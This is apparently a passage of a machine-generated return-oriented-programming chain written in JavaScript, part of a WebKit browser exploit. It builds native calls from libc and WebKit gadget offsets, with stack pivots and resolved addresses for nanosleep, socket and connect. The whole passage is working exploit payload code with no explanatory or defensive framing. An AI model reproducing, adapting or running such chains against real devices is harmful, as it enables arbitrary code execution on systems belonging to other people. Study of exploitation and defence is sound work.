db([192, 0]); // 0xc0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+763368 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+14664103, //and rax, rcx
libc_base+763368, //pop rcx
nanosleep_addr,
webkit_base+20307877, //mov [rax], rcx
libc_base+764760 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+731401, //mov rax, r8
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1172512, //L2914
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+782311 //pop rsp
]);
//L2914:
db([0, 0]); // 0x0
//L2701:
set_gadget(libc_base+764760,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+144605, //pop rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+764760, //pop rsi
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+1438842, //pop rdx
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+763368, //pop rcx
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+568675, //pop r8
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+3236123, //pop r9
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+756281, //xor rax, rax
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+11, //nop
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+11, //nop
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+764760, //pop rsi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+763368, //pop rcx
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+144605, //pop rdi
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+568675, //pop r8
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+782311, //pop rsp
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+763368 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+14664103, //and rax, rcx
libc_base+763368, //pop rcx
connect_addr,
webkit_base+20307877, //mov [rax], rcx
libc_base+764760 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+731401, //mov rax, r8
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1173840, //L2915
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+782311 //pop rsp
]);
//L2915:
db([0, 0]); // 0x0
//L2643:
set_gadget(libc_base+764760,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+144605, //pop rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+764760, //pop rsi
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+1438842, //pop rdx
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+763368, //pop rcx
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+568675, //pop r8
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+3236123, //pop r9
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+756281, //xor rax, rax
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+11, //nop
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+11, //nop
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+764760, //pop rsi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+763368, //pop rcx
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+144605, //pop rdi
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+568675, //pop r8
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+782311, //pop rsp
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+763368 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+14664103, //and rax, rcx
libc_base+763368, //pop rcx
socket_addr,
webkit_base+20307877, //mov [rax], rcx
libc_base+764760 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+731401, //mov rax, r8
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1175168, //L2916
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+782311 //pop rsp
]);
//L2916:
db([0, 0]); // 0x0
//_main:
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1175240, //L2917
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
webkit_base+568675 //pop r8
]);
//L2917:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1175304, //L2919
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
webkit_base+568675 //pop r8
]);
//L2919:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([2104, 0]); // 0x838
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608 //pop rax
]);
//L2921:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608, //pop rax
//L2923:
ropchain+1175448, //L2922
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+782311, //pop rsp
ropchain+1197936, //L2924
//L2922:
libc_base+853989, //mov rax, rcx
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1175592, //L2926
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1175608, //L2927
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1175576, //L2925
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2925:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2926:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2927:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1175720, //L2929
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1175768, //L2932
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1175736, //L2930
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2929:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2930:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
//L2931:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2932:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+21212296, //cmp rax, rsi ; sete al
libc_base+226597, //movzx eax, al
webkit_base+5507491, //shl rax, 3
libc_base+764760, //pop rsi
ropchain+1175880, //L2933+8
libc_base+501454, //add rax, rsi
libc_base+501611, //mov rax, [rax]
libc_base+764760, //pop rsi
ropchain+1175872, //L2933
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+782311 //pop rsp
]);
//L2933:
db([0, 0]); // 0x0
set_gadgets([
ropchain+1175896, //L2933+24
ropchain+1176360, //L2928
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1175936, //L2934
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2934:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2935:
db([1, 0]); // 0x1
set_gadget(libc_base+759608,); //pop rax
//L2936:
db([1, 0]); // 0x1
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1176096, //L2938
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1176112, //L2939
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1176080, //L2937
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2937:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2938:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2939:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1176216, //L2940
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1176232, //L2941
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+568675 //pop r8
]);
//L2940:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2941:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1176352, //L2942
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1176336, //L2943
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+759608 //pop rax
]);
//L2943:
db([0, 0]); // 0x0
set_gadget(libc_base+782311,); //pop rsp
//L2942:
db([0, 0]); // 0x0
//L2928:
set_gadgets([
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1176432, //L2944
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1176464, //L2946
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2944:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2945:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2946:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2947:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1176576, //L2949
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1176560, //L2948
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2948:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2949:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608 //pop rax
]);
//L2950:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608 //pop rax
]);
//L2951:
db([1, 0]); // 0x1
set_gadget(libc_base+763368,); //pop rcx
//L2952:
db([1, 0]); // 0x1
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+835093, //sub rax, rcx ; sbb rdx, rcx
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608 //pop rax
]);
//L2953:
db([2, 0]); // 0x2
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L2955:
db([4096, 0]); // 0x1000
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1176888, //L2956
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L2956:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
webkit_base+105700, //or rax, rcx
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608 //pop rax
]);
//L2958:
db([1, 0]); // 0x1
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L2960:
db([2, 0]); // 0x2
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1177080, //L2961
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L2961:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
webkit_base+105700, //or rax, rcx
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L2964:
db([4, 0]); // 0x4
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1177224, //L2965
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L2965:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
webkit_base+105700, //or rax, rcx
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1177336, //L2967
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2967:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2968:
db([131072, 0]); // 0x20000
set_gadget(libc_base+759608,); //pop rax
//L2969:
db([131072, 0]); // 0x20000
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1177464, //L2971
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1177448, //L2970
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2970:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2971:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608 //pop rax
]);
//L2972:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608, //pop rax
//L2974:
ropchain+1177616, //L2973
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+782311, //pop rsp
